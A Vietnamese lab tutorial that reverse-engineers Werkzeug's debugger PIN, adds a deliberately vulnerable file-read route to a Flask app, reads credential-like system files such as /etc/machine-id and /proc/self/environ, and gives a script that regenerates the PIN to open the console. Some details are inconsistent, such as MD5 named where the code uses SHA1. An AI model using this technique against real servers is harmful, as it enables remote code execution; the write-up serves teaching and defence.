> Trong bài [trước](https://github.com/williamdunbar/Boot2Root_2023_2/blob/master/gening%20Werkzeug%20Debugger%20Console%20Pin%20%2B%20LFI%20(Part%201%20-%20Rewrite).md) chúng ta đã cùng tìm hiểu về Flask, WSGI cũng như Werkzeug Library. Qua đó ta biết được trong Werkzeug có chức năng debugger giúp dev có thể traceback các lỗi trong quá trình vận hành. Ta cũng biết được Werkzeug tạo mã pin để ngăn chặn việc tự ý sử dụng trình debugger console.
> Bạn có tự hỏi liệu cách tạo ra mã PIN đó như thế nào. Và liệu có mối nguy hiểm nào đối với mã PIN đó hay không
# 1. Werkzeug debugger tạo ra mã PIN như thế nào ? 
- Werkzeug là một open-source vì vậy ta có thể kiểm tra mã nguồn để tìm cách hiểu và đảo ngược thuật toán tạo mã PIN của nó. (https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py)
## 1.1. Các biến môi trường cần thiết để tạo mã PIN
- Trước khi tìm hiểu vào cơ chế tạo mã pin, ta sẽ tìm hiểu các biến cần để tạo ra mã PIN đó.
- Dựa vào đường dẫn source code phía trên, ta thấy để tạo được mã PIN Werkzeug sử dụng các biến sau đây
```python
probably_public_bits = [
    username,
    modname,
    getattr(app, '__name__', getattr(app.__class__, '__name__')),
    getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()),
    get_machine_id(),
]
```
- Các biến được chia ra thành 2 loại là *public bit* và *private bit*
- Các biến trong *public bit* bao gồm:
	- `**username**` : Tên người dùng khởi chạy Flask
	- `**modname**` : Mặc định là flask.app
	- `getattr(app, '__name__', getattr (app .__ class__, '__name__'))`: Lệnh này lấy giá trị thuộc tính `name` của lớp `app`. Với framework flask, giá trị mặc định là **Flask**
	- `getattr(mod, '__file__', None)`: Là đường dẫn tuyệt đối dẫn đến * `**app.py**` (Ví dụ `/usr/local/lib/python3.5/dist-packages/flask/app.py`). 
- Các biến *private bit* bao gồm:
	- `uuid.getnode()`: Là giá trị MAC hiện tại của máy, hàm `str(uuid.getnode())` trả về giá trị hệ 10 của địa chỉ MAC
	    - Để tìm địa MAC, ta cần xác định được giao diện mạng (network interface) đang được sử dụng (Ví dụ: `ens3`, `eth0`, ...)
	    - Chúng ta có thể tìm thấy địa chỉ MAC tại `/sys/class/net/<device id>/address` 
	    - Chuyển hex address thành hệ 10 bằng lệnh print. Ví dụ:
		```python
		# It was 56:00:02:7a:23:ac
		>>>print(0x5600027a23ac)
		94558041547692
		```
- `get_machine_id()` nối nội dung của file  `/etc/machine-id` hoặc `/proc/sys/kernel/random/boot_id` với dòng đầu tiên của file `/proc/self/cgroup` sau dấu   (`/`).
## 1.2. Cơ chế tạo mã PIN
- Cơ chế tạo mã PIN dưới đây được lấy từ source code tại file `__init__.py`
```python
def get_pin_and_cookie_name( app: WSGIApplication,) -> tuple[str, str] | tuple[None, None]:
	"""Given an application object this returns a semi-stable 9 digit pin
	code and a random key. The hope is that this is stable between
	restarts to not make debugging particularly frustrating. If the pin
	was forcefully disabled this returns `None`.
	Second item in the resulting tuple is the cookie name for remembering.
	"""
		pin = os.environ.get("WERKZEUG_DEBUG_PIN")
		rv = None
		num = None
	# Pin was explicitly disabled
	if pin == "off":
		return None, None
	# Pin was provided explicitly
	if pin is not None and pin.replace("-", "").isdecimal():
		# If there are separators in the pin, return it directly
		if "-" in pin:
			rv = pin
		else:
			num = pin
	modname = getattr(app, "__module__", t.cast(object, app).__class__.__module__)
	username: str | None
	try:
		# getuser imports the pwd module, which does not exist in Google
		# App Engine. It may also raise a KeyError if the UID does not
		# have a username, such as in Docker. 
		username = getpass.getuser()
	except (ImportError, KeyError):
		username = None

	mod = sys.modules.get(modname)
	
	# This information only exists to make the cookie unique on the
	# computer, not as a security feature.
	probably_public_bits = [
		username,
		modname,
		getattr(app, "__name__", type(app).__name__),
		getattr(mod, "__file__", None),
	 ]

	private_bits = [str(uuid.getnode()), get_machine_id()]

	h = hashlib.sha1()
	for bit in chain(probably_public_bits, private_bits):
		if not bit:
			continue
		if isinstance(bit, str):
			bit = bit.encode("utf-8")
		h.update(bit)
	h.update(b"cookiesalt")
	
	cookie_name = f"__wzd{h.hexdigest()[:20]}"
	# If we need to generate a pin we salt it a bit more so that we don't
	# end up with the same value and generate out 9 digits
	if num is None:
		h.update(b"pinsalt")
		num = f"{int(h.hexdigest(), 16):09d}"[:9]

	# Format the pincode in groups of digits for easier remembering if
	# we don't have a result yet.
	if rv is None:
		for group_size in 5, 4, 3:
			if len(num) % group_size == 0:
				rv = "-".join(
					num[x : x + group_size].rjust(group_size, "0")
					for x in range(0, len(num), group_size)
				)
				break
			else:
				rv = num
				
	return rv, cookie_name
```
- Mô hình hóa đoạn code tạo mã Pin như sau
![|600](./images/Pasted%20image%2020230917140333.png)
- Chi tiết quá trình tạo mã PIN khi không được khai báo trước bằng tham số `WERKZEUG_DEBUG_PIN` như sau:
1. **Tạo chuỗi đầu vào cho mã PIN:**
    - Sử dụng danh sách `probably_public_bits` và `private_bits` để tạo một danh sách các thông tin có thể công khai và thông tin riêng tư.
    - Trong đoạn mã dưới, `h` là một đối tượng mã hóa MD5 (`hashlib.md5()`) được sử dụng để tạo mã hash MD5.
```python
	probably_public_bits = [
		username,
		modname,
		getattr(app, "__name__", type(app).__name__),
		getattr(mod, "__file__", None),
	 ]

	private_bits = [str(uuid.getnode()), get_machine_id()]

	h = hashlib.sha1()
	for bit in chain(probably_public_bits, private_bits):
		if not bit:
			continue
		if isinstance(bit, str):
			bit = bit.encode("utf-8")
```
2. **Gắn thêm muối (salt) vào danh sách thông tin:**
    - Muối (salt) là một chuỗi đặc biệt được thêm vào danh sách thông tin để làm cho quá trình tạo mã PIN trở nên duy nhất hơn. Đoạn mã sau thực hiện việc này:
```python
	h.update(b"cookiesalt")
```
3. **Mã hóa chuỗi thông tin để tạo mã hash:**
    - Sử dụng đối tượng mã hóa MD5 đã được khởi tạo để tạo mã hash MD5 của chuỗi thông tin đã được ghép lại và có muối `'pinsalt'`. Đoạn mã thực hiện việc này như sau:
```python
	h.update(bit)
```
4. **Chuyển đổi mã hash thành mã PIN:**
    - Sau khi mã hóa chuỗi thông tin, kết quả là một chuỗi mã hash MD5. Đoạn mã dưới đây thực hiện việc chuyển đổi mã hash này thành một số nguyên và định dạng số nguyên này thành một chuỗi có 9 chữ số để tạo mã PIN.
    - Trong đoạn mã này, `h.hexdigest()` trả về chuỗi hexa của mã hash MD5, và nó được chuyển đổi thành một số nguyên (base 16) và định dạng lại thành chuỗi có 9 chữ số:
```python
# Chuyển đổi mã hash thành số nguyên và định dạng thành chuỗi có 9 chữ số
	num = ('%09d' % int(h.hexdigest(), 16))[:9]
```
Kết quả là ta sẽ có một mã PIN có độ dài cố định là 9 chữ số, được tạo dựa trên các thông tin công khai và thông tin riêng tư, cùng với muối `'pinsalt'`. Mã PIN này được sử dụng cho mục đích gỡ lỗi và phát triển ứng dụng.
# 2. Liệu có cách nào để gen mã PIN không ?
- Trước khi tìm gen mã PIN, ta sẽ cùng dựng lại một chương trình Flask với Werkzeug một cách đơn giản nhất.
	## 2.1. Xây dựng môi trường lab Flask Application với Werkzeug Debugger
1. Để bạn đọc dễ hình dùng và thực hiện, tôi sẽ xây dựng ứng dụng minimal dựa trên document của Flask (Bạn có thể đọc thêm tại [đây](https://flask.palletsprojects.com/en/2.3.x/quickstart/))
2. Trong ứng dụng minimal này, ta tạo một file app.py có nội dung như sau:
```python
from flask import Flask
app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"
```

![](./images/Pasted%20image%2020230831060940.png)

3. Để có thể chạy ứng dụng này, ta cần cài đặt flask. Ở đây tôi dùng pipenv thay vì pip. (Bạn có thể tìm hiểu thêm về pipenv tại [đây](https://pipenv.pypa.io/en/latest/))
	- Cài đặt pipenv với lệnh : `pip install pipenv`
	- Cài đặt flask: `pipenv install flask`
	- Khởi động shell trên môi trường pipenv: `pipenv shell`
4. Để chạy chương trình minimal app, dùng lệnh: `flask run` . 
	- Lưu ý nếu bạn đặt tên file khác **app.py** bạn cần chạy lệnh sau: `flask --app <tên file> run`

![](./images/Pasted%20image%2020230831085921.png)

![|300](./images/Pasted%20image%2020230831061030.png)

5. Tạo một route `/bug` để tạo lỗi như sau:

![](./images/Pasted%20image%2020230831060949.png)

6. Ở đây ta thấy biến kiểu mảng `name` không thể cộng chuỗi với kiểu string. Vì vậy khi truy cập vào route này sẽ gây ra lỗi như sau

![|600](./images/Pasted%20image%2020230831061051.png)

7. Như đã nói ở [phần 1](https://github.com/williamdunbar/Boot2Root_2023_2/blob/master/gening%20Werkzeug%20Debugger%20Console%20Pin%20%2B%20LFI%20(Part%201%20-%20Rewrite).md) khi chưa bật chế độ debug, lỗi chỉ hiện thị `Internal Server Error`. Để hiển thị traceback ta cần bật chế độ debug với lệnh `flask run --debug`

![|500](./images/Pasted%20image%2020230831061143.png)

8. Ta có thể thấy mã PIN ở trên. Cùng lúc đó lỗi hiển thị lúc này như sau:
![|600](./images/Pasted%20image%2020230831061210.png)
9. Để truy cập vào console ta có thể click vào biểu tượng console dưới mỗi frame hoặc truy cập vào đường dẫn `/console`
![|600](./images/Pasted%20image%2020230831061307.png)

![|600](./images/Pasted%20image%2020230831061244.png)
10. Để có thể truy cập vào ta cần mã pin đã hiển thị khi bật chế độ debug. Vậy có cách nào để gen được mã PIN này không. Hãy cùng tiếp tục tìm hiểu trong phần tiếp theo
## 2.2. Thực hiện gen mã PIN 
- Để có thể gen mã PIN chúng ta cần đọc các biến môi trường của hệ thống. Có nhiều cách để có thể làm được việc này. Ở đây để thuận tiện nhất ta sẽ sử dụng lỗ hổng Path Traversal. Trước tiên ta tao thê 1 route /lfi để thực hiện khai thác path traversal
```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"
    
@app.route("/bug")
def hello_bug():
    return "<p>Hello, World!</p>" + name
    
@app.route("/lfi", methods=["GET", "POST"])
def lfi_endpoint():
    if request.method == "POST":
        file_path = request.form.get("file_path")

        try:
            with open(file_path, "r") as file:
                file_content = file.read()
                return f"<pre>{file_content}</pre>"
        except Exception as e:
            return f"Error: {e}"

    return """
    <form method="post" action="/lfi">
        Enter file path: <input type="text" name="file_path">
        <input type="submit" value="Read File">
    </form>
    """
if __name__ == "__main__":
    app.run(host='0.0.0.0', port='5000', debug=True)
```
- Kiểm tra khai thác LFI:

![|400](./images/Pasted%20image%2020230831201138.png)

![|400](./images/Pasted%20image%2020230831201152.png)
### a. Lấy các biến môi trường
- Bước tiếp theo, ta sẽ lợi dụng Path Traversal để tìm kiếm các biến môi trường
1. `username`
- Mặc định, username chạy tiến trình sẽ được lấy file */proc/self/environ* bởi lẽ đây là file chứa các biến môi trường của tiến trình 
![](./images/Pasted%20image%2020230831201731.png)
=> Như vậy biến`username` có giá trị là **w1ll14m**
2.  `modname` : Giá trị mặc định của biến này là **flask.app**
3. `name` của app: đọc source code ta thấy biến name của app là **Flask**

![](./images/Pasted%20image%2020230831202100.png)

![](./images/Pasted%20image%2020230831202108.png)
4. Đường dẫn tuyệt đối đến `app.py`
- Để lấy đường dãn tuyệt đối của app.py chúng ta cần xem lại traceback khi xuất hiện lỗi, truy cập route `/bug`. Chúng ta thấy đường dẫn tuyệt đối đến app.py là **/usr/lib/python3/dist-packages/flask/app.py**
![](./images/Pasted%20image%2020230831202230.png)
5. Địa chỉ MAC của machine
- Có rất nhiều cách có thể lấy được địa chỉ MAC tại thời điểm này. Tuy nhiên lúc này chúng ta sẽ khai thác tối đa công dụng của lỗ hổng Path Traversal \
- Bước 1: chúng ta cần check interface. Ta có thể xem file _/proc/net/arp_ - đây là bảng ARP trong linux. Bạn có thể tìm hiểu thêm tại [đây](https://www.baeldung.com/linux/arp-command)

![|600](./images/Pasted%20image%2020230831202727.png)
	- Ta thấy chỉ có một interface là **ens33** với địa chỉ IP của host
- Bước 2: Tiếp theo cần lấy địa chỉ MAC tương ứng với interface này
	- Ta có thể tìm thấy được vị trí lưu địa chỉ MAC tương ứng interface ens33 tại */sys/class/net/eth0/address*. Tham khảo thêm tại [đây](https://stackoverflow.com/questions/17950405/im-trying-to-get-the-mac-address-as-a-variable-in-linux-but-it-rarely-works)

![](./images/Pasted%20image%2020230831203428.png)
	- Tuy nhiên điều ta cần lại là địa chỉ MAC ở dạng decimal. Vì vậy cần biến đối 1 chút. Có nhiều cách. Nhưng vì quá lười :) mình gợi í cho các bạn sử dụng trang sau: https://www.vultr.com/resources/mac-converter/
![|500](./images/Pasted%20image%2020230831203627.png)
	=> Vậy địa chỉ MAC ta cần là **52240203779**
	
6. `machine-id`
- Để lấy `machine-id` ta truy cập vào đường dẫn  */etc/machine-id*: **ca07cc8b33b044adb73f8b86f4c51bf6**
![](./images/Pasted%20image%2020230831204021.png)
7. `cgroup value`
- Để lấy `cgroup value` ta truy cập vào đường dẫn  */proc/self/cgroup*.

![](./images/Pasted%20image%2020230831204210.png)
- Lưu ý ở đây ta chỉ lấy gái trị cuối cùng ngăn cách bởi dấu / vì vậy kêt quả là:  **session-3.scope**
=> từ 6 và 7 ta ghép dược 1 chuối **ca07cc8b33b044adb73f8b86f4c51bf6session-3.scope**
### b. Tái tạo thuật toán gen mã PIN
```python
import itertools
import hashlib
from itertools import chain

def gen_md5(username, modname, appname, flaskapp_path, node_uuid, machine_id):
   h = hashlib.md5()
   gen(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def gen_sha1(username, modname, appname, flaskapp_path, node_uuid, machine_id):
   h = hashlib.sha1()
   gen(h, username, modname, appname, flaskapp_path, node_uuid, machine_id)

def gen(hasher, username, modname, appname, flaskapp_path, node_uuid, machine_id):
   probably_public_bits = [
		   username,
		   modname,
		   appname,
		   flaskapp_path ]
   private_bits = [
		   node_uuid,
		   machine_id ]

   h = hasher
   for bit in chain(probably_public_bits, private_bits):
	   if not bit:
		   continue
	   if isinstance(bit, str):
		   bit = bit.encode('utf-8')
	   h.update(bit)
   h.update(b'cookiesalt')

   cookie_name = '__wzd' + h.hexdigest()[:20]

   num = None
   if num is None:
	   h.update(b'pinsalt')
	   num = ('%09d' % int(h.hexdigest(), 16))[:9]

   rv =None
   if rv is None:
	   for group_size in 5, 4, 3:
		   if len(num) % group_size == 0:
			   rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
							 for x in range(0, len(num), group_size))
			   break
	   else:
		   rv = num

   print(rv)

if __name__ == '__main__':

   usernames = ['w1ll14m']
   modnames = ['flask.app']
   appnames = ['wsgi_app', 'Flask']
   flaskpaths = ['/usr/lib/python3/dist-packages/flask/app.py']
   nodeuuids = ['52240203779']
   machineids = ['ca07cc8b33b044adb73f8b86f4c51bf6session-3.scope']

   # Generate all possible combinations of values
   combinations = itertools.product(usernames, modnames, appnames, flaskpaths, nodeuuids, machineids)

   # Iterate over the combinations and call the gen() function for each one
   for combo in combinations:
	   username, modname, appname, flaskpath, nodeuuid, machineid = combo
	   print('==========================================================================')
	   gen_sha1(username, modname, appname, flaskpath, nodeuuid, machineid)
	   print(f'{combo}')
	   print('==========================================================================')
```
- Kết quả khi chạy file gen
![](Pasted%20image%2020230831205911.png)
- Truy cập vào route `/console` nhập PIN => ta đã truy cập được vào debugger console
![](./images/Pasted%20image%2020230831210221.png)

# 3. Kết luận và cách khắc phục
- Như vậy ta thấy việc re-gen mã PIN là hoàn toàn khả thi. Cùng với đó là nguy cơ bị hacker RCE, reveseshell và leo thang đặc quyền dẫn tới mất dữ liệu và bị mất quyền điều khiển server.
- Để khắc phục điều này, werkzeug có thể thay đổi thuật toán gen mã PIN hoặc thay đổi các tham số truyền vào. 
- Với phương diện lập trình viên, cần đặc biệt lưu ý việc tắt chức năng debug trong quá trình triển khai thành sản phẩm. Từ đó loại bỏ hoàn toàn nguy cơ bị khai thác gen mã PIN như trên








